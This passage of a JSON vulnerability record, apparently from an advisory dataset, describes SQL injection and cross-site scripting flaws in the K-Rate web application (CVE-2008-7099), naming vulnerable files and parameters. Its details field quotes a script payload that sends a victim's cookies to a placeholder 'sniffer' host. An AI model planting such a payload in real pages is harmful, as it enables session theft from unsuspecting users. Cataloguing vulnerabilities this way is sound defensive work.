  "vulnerability_details": [
    {
      "cve": "CVE-2008-7099",
      "root_cause": "Improper sanitization of user-supplied input in multiple locations within the K-Rate application.",
      "weaknesses": [
        "SQL Injection",
        "Cross-Site Scripting (XSS)"
      ],
      "impact": "An attacker can execute arbitrary SQL queries to potentially extract sensitive data or compromise the database. They can also inject malicious scripts into web pages, enabling them to steal user credentials, redirect users to malicious sites, or perform other client-side attacks.",
      "attack_vectors": [
        "HTTP requests with manipulated parameters",
          "Blog posts",
          "Gallery content",
          "Forum posts"
      ],
        "required_capabilities": [
        "Must be authenticated as a regular user for some SQL Injection attacks",
        "Ability to post content on the blog, gallery, or forum for XSS attacks"
      ],
         "details": "The application is vulnerable to SQL Injection in multiple files, including `admin/includes/dele_cpac.php`, `payments/payment_received.php`, `includes/functions.php`, and `modules/chat.php`. Vulnerable parameters include `id`, `ord[order_id]`, and `room`. The application is also vulnerable to both active and passive XSS attacks within the blog, gallery, and forum.  The identified SQL injection vulnerabilities can be exploited by injecting specially crafted SQL queries through URL parameters, such as `id`, and other parameters. The XSS vulnerability can be exploited by injecting a `<script>` tag within a blog post, gallery, or forum, which will then execute in the context of another userâ€™s browser session. Example XSS payload: `<script>img = new Image(); img.src = \"http://sniffer/sniff.jpg?\"+document.cookie;</script>`."
